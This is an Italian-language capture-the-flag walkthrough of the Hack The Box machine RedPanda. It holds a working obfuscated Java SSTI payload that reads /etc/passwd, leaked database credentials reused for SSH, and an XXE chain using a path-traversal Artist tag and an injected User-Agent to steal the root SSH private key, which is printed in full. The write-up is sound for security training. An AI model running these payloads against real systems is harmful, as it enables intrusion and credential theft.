# RedPanda
* **POINTS**: 20
* **USER RATING**: Easy
* **OPERATING SYSTEM**: Linux
* **RATING**: 3.2

## 1. Recon
```shell
└─$ nmap -sC -sV -oA nmap/initial 10.129.34.130
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 04:18 EDT
Nmap scan report for 10.129.34.130
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 11 Jul 2022 08:19:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 11 Jul 2022 08:19:10 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 11 Jul 2022 08:19:10 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=7/11%Time=62CBDCFB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,690,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;charse
SF:t=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\x2011\x20Jul\x20
SF:2022\x2008:19:10\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20htm
SF:l>\n<html\x20lang=\"en\"\x20dir=\"ltr\">\n\x20\x20<head>\n\x20\x20\x20\
SF:x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta\x20author=\"woode
SF:n_k\">\n\x20\x20\x20\x20<!--Codepen\x20by\x20khr2003:\x20https://codepe
SF:n\.io/khr2003/pen/BGZdXw\x20-->\n\x20\x20\x20\x20<link\x20rel=\"stylesh
SF:eet\"\x20href=\"css/panda\.css\"\x20type=\"text/css\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/main\.css\"\x20type=\"text/c
SF:ss\">\n\x20\x20\x20\x20<title>Red\x20Panda\x20Search\x20\|\x20Made\x20w
SF:ith\x20Spring\x20Boot</title>\n\x20\x20</head>\n\x20\x20<body>\n\n\x20\
SF:x20\x20\x20<div\x20class='pande'>\n\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s='ear\x20left'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='ear\x20r
SF:ight'></div>\n\x20\x20\x20\x20\x20\x20<div\x20class='whiskers\x20left'>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x
SF:20\x20\x20<div\x20class='whiskers\x20right'>\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<span></span>\n\x20\x20\x20\x20\x20\x20</
SF:div>\n\x20\x20\x20\x20\x20\x20<div\x20class='face'>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<div\x20class='eye")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x
SF:20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Mo
SF:n,\x2011\x20Jul\x202022\x2008:19:10\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/
SF:html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435
SF:\r\nDate:\x20Mon,\x2011\x20Jul\x202022\x2008:19:10\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>H
SF:TTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x2
SF:0type=\"text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1
SF:,\x20h2,\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x
SF:20{font-size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px
SF:;}\x20p\x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{heigh
SF:t:1px;background-color:#525D76;border:none;}</style></head><body><h1>HT
SF:TP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html
SF:>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

### 1.1 Red Panda Search | Made with Spring Boot - TCP 8080
#
![web](Images/web.png)

Vediamo se ci sono endopoint con *gobuster*:

```shell
└─$ gobuster dir -u http://10.129.34.130:8080/ -w ~/Scaricati/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.34.130:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asd/Scaricati/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/11 04:25:17 Starting gobuster in directory enumeration mode
===============================================================
/error                (Status: 500) [Size: 86]
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
                                               
===============================================================
2022/07/11 04:25:46 Finished
===============================================================
```

## 2. SSTI
Intercettando la richiesta di *search* vediamo come ciò che cerchiamo venga riportato a video e ciò ci fa pensare ad un attacco di tipo *SSTI*.

### 2.1 PoC
Proviamo com il solito payload `${7 * 7}`, ma ci dice che alcuni caratteri sono bannati

![error](Images/ssti%20error.png)

Cerchiamo un altro payload per capire anche quale sia l'engine che sta "dietro"

![poc](Images/ssti%20PoC.png)

È Java... quindi cerchiamo i payload riferito a questo *engine*. 

Cercando dei payload, mi sono imbattuto su un [generatore automatico](https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py) scritto in python. Esso genera i payload con il dollaro iniziale, cambiambo tale carattere con l'asterisco (che non è in blacklist) ho il payload generato correttamente.

Per semplicità si è creato uno [script](script.py) che gestisce automaticamente la creazione del payload e la richiesta al serve. 

Faccio `cat /etc/passwd`

Payload: `*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

Abbiamo la possibilità di leggere tutto, quindi leggiamo la flag in */home/woodenk*: `d0bcc55bc0f264cd7861b2b8888f2415`

## 3. Privilege Escalation
Non abbiamo la chiave ssh per tale utente quindi bisogna capire come accedere. 

### 3.1 Enumerazione dei servizi
#
Tra le varie cose provate, particolare interesse ha suscitato l'output del comando `ps`:

```shell
root         862  0.0  0.0   2608   600 ?        Ss   06:44   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         863  0.0  0.2   9420  4636 ?        S    06:44   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         880  0.0  0.3  12172  7408 ?        Ss   06:44   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
woodenk      881 11.2 12.1 3138016 247684 ?      Sl   06:44  20:12 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

Questo perchè ci da informazioni riguardo il codice sorgente del server, infatti cercando in */opt/panda_search* abbiamo la cartella *src* ed in particolare si è esamintato il codice di *MainController.java* (in */opt/panda_search/src/main/java/com/panda_search/htb/panda_search/*):

```java
package com.panda_search.htb.panda_search;

import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
        public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
                SAXBuilder saxBuilder = new SAXBuilder();
                if(author == null)
                author = "N/A";
                author = author.strip();
                System.out.println("" + author + "");
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        String path = "/credits/" + author + "_creds.xml";
                        File fd = new File(path);
                        Document doc = saxBuilder.build(fd);
                        Element rootElement = doc.getRootElement();
                        String totalviews = rootElement.getChildText("totalviews");
                        List&lt;Element&gt; images = rootElement.getChildren("image");
                        for(Element image: images)
                                System.out.println(image.getChildText("uri"));
                        model.addAttribute("noAuthor", false);
                        model.addAttribute("author", author);
                        model.addAttribute("totalviews", totalviews);
                        model.addAttribute("images", images);
                        return new ModelAndView("stats.html");
                }
                else
                {
                        model.addAttribute("noAuthor", true);
                        return new ModelAndView("stats.html");
                }
        }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter &#39;author&#39;\n\r");
                }
        }
  @PostMapping("/search")
        public ModelAndView search(@RequestParam("name") String name, Model model) {
        if(name.isEmpty())
        {
                name = "Greg";
        }
        String query = filter(name);
        ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
        model.addAttribute("pandas", pandas);
        model.addAttribute("n", pandas.size());
        return new ModelAndView("search.html");
        }
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList&lt;ArrayList&gt; pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList&lt;String&gt; panda = new ArrayList&lt;String&gt;();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
                panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

L'interesse è stato suscitato dal metodo *searchPanda* nel quale si effettua una connessione ad un DB con username : `woodenk` e password : `RedPandazRule`.

Arrivati a questo punto si prova a vedere se c'è password reuse per accedere al servizio ssh.

```shell
└─$ ssh woodenk@10.129.34.130
The authenticity of host '10.129.34.130 (10.129.34.130)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.34.130' (ED25519) to the list of known hosts.
woodenk@10.129.34.130's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 11 Jul 2022 10:07:05 AM UTC

  System load:           0.0
  Usage of /:            88.7% of 4.30GB
  Memory usage:          40%
  Swap usage:            0%
  Processes:             212
  Users logged in:       0
  IPv4 address for eth0: 10.129.34.130
  IPv6 address for eth0: dead:beef::250:56ff:fe96:9988

  => / is using 88.7% of 4.30GB


0 updates can be applied immediately.


Last login: Tue Jul  5 05:51:25 2022 from 10.10.14.23
woodenk@redpanda:~$
```

Abbiamo la shell !

### 3.2 Shell to Root
#
Avviando *pspy* si notano dei processi che ci possono tornare utili:

```shell
2022/07/11 15:55:33 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/07/11 15:56:01 CMD: UID=0    PID=1283   | /bin/sh -c /root/run_credits.sh 
2022/07/11 15:56:01 CMD: UID=0    PID=1282   | /usr/sbin/CRON -f 
2022/07/11 15:56:01 CMD: UID=0    PID=1285   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar                                                                                                   
2022/07/11 15:56:01 CMD: UID=0    PID=1284   | /bin/sh /root/run_credits.sh 
2022/07/11 15:58:01 CMD: UID=0    PID=1303   | /usr/sbin/CRON -f 
2022/07/11 15:58:01 CMD: UID=0    PID=1302   | /usr/sbin/CRON -f 
2022/07/11 15:58:01 CMD: UID=0    PID=1305   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar                                                                                                   
2022/07/11 15:58:01 CMD: UID=0    PID=1304   | /bin/sh /root/run_credits.sh 
2022/07/11 16:00:01 CMD: UID=0    PID=1327   | /usr/sbin/CRON -f 
2022/07/11 16:00:01 CMD: UID=0    PID=1326   | sudo -u woodenk /opt/cleanup.sh 
2022/07/11 16:00:01 CMD: UID=0    PID=1325   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
2022/07/11 16:00:01 CMD: UID=0    PID=1324   | /usr/sbin/CRON -f 
2022/07/11 16:00:01 CMD: UID=0    PID=1323   | /usr/sbin/CRON -f 
2022/07/11 16:00:01 CMD: UID=0    PID=1329   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar                                                                                                   
2022/07/11 16:00:01 CMD: UID=0    PID=1328   | /bin/sh /root/run_credits.sh 
2022/07/11 16:00:01 CMD: UID=1000 PID=1331   | 
2022/07/11 16:00:01 CMD: UID=1000 PID=1333   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
2022/07/11 16:00:01 CMD: UID=1000 PID=1334   | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
2022/07/11 16:00:01 CMD: UID=1000 PID=1339   | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
2022/07/11 16:00:01 CMD: UID=1000 PID=1340   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/07/11 16:00:01 CMD: UID=1000 PID=1351   | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
2022/07/11 16:00:01 CMD: UID=1000 PID=1352   | /bin/bash /opt/cleanup.sh 
2022/07/11 16:00:01 CMD: UID=1000 PID=1353   | /bin/bash /opt/cleanup.sh 
2022/07/11 16:00:01 CMD: UID=1000 PID=1354   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
2022/07/11 16:02:01 CMD: UID=0    PID=1358   | /usr/sbin/CRON -f 
2022/07/11 16:02:01 CMD: UID=0    PID=1359   | /bin/sh -c /root/run_credits.sh 
2022/07/11 16:02:01 CMD: UID=0    PID=1361   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar                                                                                                   
2022/07/11 16:02:01 CMD: UID=0    PID=1360   | /bin/sh /root/run_credits.sh
```

Vendedo cosa è presente in */opt/credit-score*, si è trovato il sorgente del LogParser (*/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java*)

```java
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}
```

CONSIDERAZIONI:
* Possiamo vedere che una variabile chiamata "line" viene passata a una funzione chiamata *parseLog*, possiamo quindi fare un poisoning dell'URI aggiungendo un extra "||" al nostro user agent (così l'URI viene valutato correttamente).
* La funzione *getArtist* restituisce ciò che è presente nel tag *Artist*.
* La funzione *addViewTo* riceve un path ed un URI, quindi di potrebbe pensare di sfruttare quanto sopra per far valutare correttamente la richiesta e quindi far scrivere, in maniera arbitraria delle info con i permessi di root.

#### 3.3 XXE
#

Dapprima creiamo un'immagine random:

```shell
mx=320;my=256;head -c "$((3*mx*my))" /dev/urandom | convert -depth 8 -size "${mx}x${my}" RGB:- img.jpg
```

Dopo di che aggiungiamo il tag *Artist* con `exiftool`:

```shell
exiftool -Artist='../home/woodenk/asd' img.jpg
```

Ora possiamo creare un XML che includa un exploit XXE per provare a leggere file arbitrari:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY entity SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/img.jpg</uri>
    <asd>&entity;</asd>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Salviamo tale file come *asd_creds.xml* (per rispettare quanto scritto nel codice) ed inviamo la richiesta tramite burp:

```http
GET / HTTP/1.1
Host: 10.129.34.13:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 ||/../../../../../../../home/woodenk/img.jpg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

Quindi aspettiamo che la richiesta venga espletata per avere quanto richiesto nell'xml:

```shell
woodenk@redpanda:~$ cat asd_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE foo>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/img.jpg</uri>
    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</hello>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Salviamo la chiave, cambiamo i permessi ed effettuiamo l'accesso con ssh

```shell
└─$ ssh -i key.priv root@10.129.34.13
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 11 Jul 2022 02:04:08 PM UTC

  System load:           0.0
  Usage of /:            80.6% of 4.30GB
  Memory usage:          43%
  Swap usage:            0%
  Processes:             217                                                                                       
  Users logged in:       1                                                                                         
  IPv4 address for eth0: 10.129.34.13                                                                              
  IPv6 address for eth0: dead:beef::250:56ff:fe96:f939                                                             
                                                                                                                   
                                                                                                                   
0 updates can be applied immediately.                                                                              
                                                                                                                   
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                                                 
                                                                                                                   
                                                                                                                   
Last login: Thu Jun 30 13:17:41 2022                                                                               
root@redpanda:~#
```

Quindi abbiamo la root flag: `f16dd64c4e8eed12e117cdf590ff0a05`